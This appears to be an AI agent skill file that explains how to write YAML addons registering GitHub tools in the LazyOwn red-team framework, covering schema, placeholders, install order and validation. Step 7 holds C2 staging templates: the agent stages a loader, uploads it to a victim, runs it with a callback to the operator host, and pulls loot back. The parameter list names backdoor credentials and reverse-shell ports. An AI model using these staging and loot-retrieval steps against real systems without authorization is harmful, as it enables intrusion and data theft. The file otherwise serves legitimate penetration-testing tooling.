---
name: lazyaddon-creator
description: "Create a working LazyOwn lazyaddon YAML from a GitHub URL in one shot. Knows the exact schema, placeholder allowlist, install/execute/C2 staging semantics and validation rules."
trigger: /lazyaddon-creator
---

# /lazyaddon-creator

Given a GitHub URL, write `lazyaddons/<name>.yaml` that registers the tool as a first-class LazyOwn command on the first try. No iteration: fetch facts, pick the archetype, fill the template, run the self-check, write the file.

## Usage

```
/lazyaddon-creator https://github.com/user/repo
```

## Step 1 — Fetch repo facts

```bash
REPO=user/repo
curl -fsSL "https://api.github.com/repos/$REPO" | python3 -c "import json,sys; m=json.load(sys.stdin); print(m['name'], '|', m['owner']['login'], '|', m['language'], '|', (m['description'] or '')[:200])"
curl -fsSL "https://api.github.com/repos/$REPO/contents/" | python3 -c "import json,sys; print([e['name'] for e in json.load(sys.stdin)])"
curl -fsSL "https://raw.githubusercontent.com/$REPO/HEAD/README.md" | head -c 4000
```

You need: repo name, owner, primary language, root file list, README usage section (the PRIMARY command users run).

## Step 2 — Pick the archetype

| # | Archetype | When | Reference addon |
|---|-----------|------|-----------------|
| A | Cloned tool, local execute | Scanner / analyzer run on operator host | `rea.yaml`, `trivy.yaml` |
| B | Global binary, no build | `npm install -g`, `pipx install`, `go install` tool | `gemini-cli.yaml` |
| C | C2 stager | Build implant/loader, stage to `sessions/`, deliver via `lazycommand` | `beacon.yaml` |
| D | C2 remote ops | Push binary to victim, run it there, pull loot back | `CGOblin.yaml` |
| E | No-clone wrapper | Pure `execute_command`, no `repo_url`/`install_path` (already-installed CLI) | `opencode_agent.yaml` |

## Step 3 — Fill the template

```yaml
name: shortname                 # do_<name>. MUST match ^[a-z][a-z0-9_]{0,63}$
description: |                  # Shown by help. Max 500 chars. Usage + requirements.
  What it does. First-time setup. Operator flow with assign.
author: Repo Owner              # Max 80 chars
version: "1.0"                  # MUST match ^\d+(\.\d+){0,3}$ — digits and dots only
enabled: true                   # Loader defaults to False. Omit this and nothing registers.
params:                         # Max 20. Every placeholder used MUST be declared here...
  - name: target                # ...MUST match ^[a-z][a-z0-9_]{0,47}$, type string|integer|boolean
    type: string
    required: true              # required=true MUST exist in live shell params
                                # (payload.json or params/*.yaml, see Step 4)
    description: Path to analyze. Max 200 chars, never empty.
os: any                         # any|linux|windows|macos|network|containers|saas|iaas
trigger: []                     # nmap service names, or [all]. [] = never auto-suggested.
category: "03. Exploitation"    # MUST match ^\d{2}\. [name]$ — pick from the table below
module_type: exploit            # optional: scanner|exploit|payload|auxiliary
tool:
  name: Display Name
  repo_url: https://github.com/user/repo.git   # MUST end with .git (except archetype E)
  install_path: external/.exploit/repo         # relative, no spaces, no '..'
  install_command: make                         # runs ONCE on fresh clone, as: cd <install_path> && <cmd>
  execute_command: ./tool scan {target} --json  # SINGLE braces only. Primary usage, nothing else.
```

## Step 4 — Placeholders (the rule that breaks most addons)

- **Single braces only: `{param}`.** `{{param}}` fails validation and survives substitution visibly.
- **YAML `default:` NEVER substitutes at runtime.** The wrapper (`lazyown.py` via
  `utils.replace_command_placeholders`) substitutes **exclusively** from live shell
  params: `payload.json` ∪ `params/*.yaml`. A `{token}` missing there renders
  **literally** into the executed command; a `required: true` param missing there
  aborts with a warning before executing. Declaring a param with a `default:` does
  NOT make it resolve — the default is documentation only.
- Consequence: every `{token}` in `execute_command`, `install_command`,
  `remote_command`, `lazycommand`, `upload_file` or `download_file` MUST be either
  a key from the list below (all present in `payload.json` or `params/extended.yaml`)
  or a param you register yourself in **all four** places:
  1. `params/extended.yaml` (runtime value + makes `assign <key>` work; never edit
     `payload.json` by hand — use `assign` / `lazyown_set_config`),
  2. `core/payload_schema.py` SCHEMA (type coercion + validation),
  3. `lazyc2/addon_creator.py` `payload_placeholders` (validator + web creation form),
  4. this list below (documentation).
- **Placeholder vs free args** — operator text after the command is appended verbatim
  AFTER `execute_command` (`cd <install_path> && <execute_command> <free-args>`):
  - Use a **placeholder** (+ `assign` flow) for stable scope/config reused across runs:
    region, server URL, scan subcommand, output paths.
  - Use **free args** for per-run input: targets, profiles, extra flags, repeatable
    `--resource`/`--namespace`. Works with argparse-style optional flags in any
    position. Does NOT work for positional subcommands (embed them as placeholders,
    e.g. `./trivy {trivy_scan_type} … {trivy_target}`), for `;`-chained suite commands
    (args land on the LAST command only — document "takes no free args"), or for
    `lazycommand`-only addons (args append to `execute_command`, which they lack).
  - **Secrets are never placeholders** (visible in `ps`): tokens, secret keys and
    passwords travel via env vars (`AZURE_ARM_TOKEN`, `K8S_TOKEN`, …) or free args,
    and the description must say so.
- The default command must be complete and useful with zero free args.

Known `payload.json` keys (no declaration needed beyond the `params` entry):

```
aes_key api_key backdoor_linux_home backdoor_password backdoor_username backdoor_win_home
backdoor_win_service_path baseoutputdir binary_name c2_decoy_mode c2_fallback_urls c2_malleable_route
c2_open_registration c2_pass c2_port c2_require_beacon_hmac c2_user ca_name cert_pass cloud_prefix
cloud_provider cloud_region data data_file dc_ip device dirwordlist dnswordlist domain
email_from email_password email_to email_username enable_c2_implant_debug enable_chainmode enable_cloudflare
enable_operator_presence enable_toasts endip entropia_artifact entropia_harness_args entropia_kind entropia_name
entropia_opsec entropia_out entropia_seed entropia_seed_a entropia_seed_b entropia_src entropia_type
exploitdb exploitgym_admin_key exploitgym_anthropic_key exploitgym_flag_seed exploitgym_model exploitgym_openai_key
exploitgym_path exploitgym_server_api_key exploitgym_server_salt ext field file ghidra_plugin_url ghidra_server
grype_target headers headers_file hide_code ip json_data json_data_file lhost listener lport
mcp_host mcp_port method mode nameserver os_id outputdir params params_file pass password
path port prompt proxy_port rat_key region report_output_path reverse_shell_port rhost rport
s sandboxed scan_type scope scope_enforcement sleep sleep_start smtp_port smtp_server spoof_ip
start_pass start_user startip subdomain target target_path template_name toast_max_per_tick toolname
topoexploit_path topoexploit_port trivy_scan_type trivy_target tui_theme ui_hints url url_traffic_1
url_traffic_2 url_traffic_3 user user_agent_1 user_agent_2 user_agent_3 user_agent_lin
user_agent_win username usrwordlist wordlist
```

## Step 5 — Runtime order (design against this, not against wishes)

1. Placeholders substitute from live shell params ONLY (`payload.json` ∪ `params/*.yaml`); missing keys render literally, except `required: true` params missing from params abort with a warning.
2. If `install_path` missing: `git clone <repo_url> <install_path>`, then `cd <install_path> && <install_command>`. **Install runs only on fresh clone, never again.** If the binary is missing later, the operator only gets a warning + hint.
3. Execute: `cd <install_path> && <execute_command> <free-args>`. A missing first token only warns — it never installs.
4. `upload_file`: comma-separated paths → `upload_c2` each (C2 must be live).
5. `remote_command`: placeholders substituted → `issue_command_to_c2`.
6. `download_file`: comma-separated victim paths → `download_c2` each.
7. `lazycommand`: placeholders substituted, **split by comma**, each chunk runs as a LazyOwn shell command via `onecmd`. Printed, not silent.

Consequences: **no commas inside `lazycommand`/`upload_file`/`download_file` entries** — a comma is a separator, not punctuation. `install_command` must leave the tool runnable without operator input. Stage delivery artefacts to `sessions/` with stable names so the C2 file endpoint can serve them (`../../../sessions/<file>` from inside `install_path`).

## Step 6 — install_command decision tree

```
Makefile/makefile          → make (or the README's real target: make windows, make build)
go.mod                     → go build .   (cross: GOOS=windows GOARCH=amd64 go build -o loader.exe)
setup.py/pyproject.toml    → pip install .
requirements.txt only      → pip install -r requirements.txt
Cargo.toml                 → cargo build --release  (binary lands in target/release/)
package.json (CLI)         → npm install && npm run build   — or archetype B: npm install -g <pkg>@<ver>
CMakeLists.txt             → mkdir build && cd build && cmake .. && make
prebuilt releases only     → rm -f <bin>; curl -sSfL <release-url> | tar xz -C . <bin> && chmod +x <bin>
nothing to build (script)  → omit install_command entirely
```

Prefer the release-tarball pattern (see `trivy.yaml`/`grype.yaml`) over building from source when the repo publishes binaries: faster, deterministic, no toolchain dependency.

## Step 7 — C2 staging fields (archetypes C and D)

```yaml
  execute_command: make && cp loader ../../../sessions/loader && echo "staged at sessions/loader"
  upload_file: ./external/.exploit/repo/loader        # operator-host path → upload_c2
  remote_command: chmod +x loader && ./loader -url http://{lhost}/loader
  download_file: /tmp/loot.txt                        # victim path → download_c2
  lazycommand: serve 8000, upload_c2 sessions/loader  # LazyOwn shell commands, comma-separated
```

Use `upload_file` + `remote_command` when the binary runs ON the victim; use `lazycommand` when the operator must run LazyOwn shell commands (serve files, chain commands). `env:` under `tool:` is dashboard-only metadata — the CLI wrapper ignores it.

## Step 8 — Categories, os, trigger

Categories (MUST match `^\d{2}\. …$`): `01. Reconnaissance`, `02. Scanning & Enumeration`, `03. Exploitation`, `04. Evasion & Bypass`, `04. Post-Exploitation`, `06. Privilege Escalation`, `07. Credential Access`, `08. Lateral Movement`, `09. Data Exfiltration`, `10. Command & Control`, `11. Reporting`, `12. Credential Access & Bypass`, `12. Miscellaneous`, `16. Artificial Intelligence`, `17. Cloud Attacks`, `18. Container & Kubernetes`, `20. CI/CD Pipeline Attacks`.

- `os`: victim platform the addon targets. `any` = operator-side tool, never filtered. Unknown values warn and fall back to `any`.
- `trigger`: lowercase nmap service names (`http`, `microsoft-ds`, `ldap`) that auto-suggest the addon, or `[all]` for broad scanners, or `[]` for manual tools. Max 40, each matching `^[a-z0-9][a-z0-9\-]{0,63}$`. Never declare services the tool does not genuinely operate against.

## Step 9 — One-shot self-check (run before writing)

```bash
python3 -m pytest tests/test_placeholder_coverage.py -q
```

This locks all of the above across the whole repo: validator allowlist ⊇ live keys,
schema ⊇ live keys, skill list ⊇ validator, every addon token declared-or-known,
every enabled-addon token present in live shell params, every `required: true`
param without `default:` present in live params. If it fails, register the missing
key in the four places from Step 4 — do not paper over it with a YAML `default:`.

Plus these manual assertions — every one must hold:

1. `enabled: true` present. 2. `name` matches `^[a-z][a-z0-9_]{0,63}$` and file is `lazyaddons/<name>.yaml`. 3. `version` is digits-and-dots. 4. `repo_url` ends with `.git` (unless archetype E, which omits `repo_url` + `install_path`). 5. No `{{`/`}}` anywhere. 6. Every `{token}` resolves from live shell params (`payload.json` ∪ `params/*.yaml`) — verify with `python3 -c "import json,yaml,glob; live=set(json.load(open('payload.json'))); [live.update((yaml.safe_load(open(f)) or {}).keys()) for f in glob.glob('params/*.yaml')]; print('cloud_region' in live)"`. 7. Every `required: true` param without `default:` exists in live params. 8. `execute_command` is the tool's primary usage, complete without free args. 9. No commas inside any single `lazycommand`/`upload_file`/`download_file` entry. 10. `description` documents first-time setup + the `assign <key>` flow (only for keys that exist) + free-args examples. 11. `install_command` is non-interactive and idempotent enough for a fresh clone. 12. `category`/`os`/`trigger` match the Step 8 tables. 13. No secrets as placeholders — env vars or free args only.

## Step 10 — Write and register

Write to `lazyaddons/<name>.yaml`, then inside the LazyOwn shell run `reload_addons` (or restart). Verify with `list_addons` and `help <name>`.
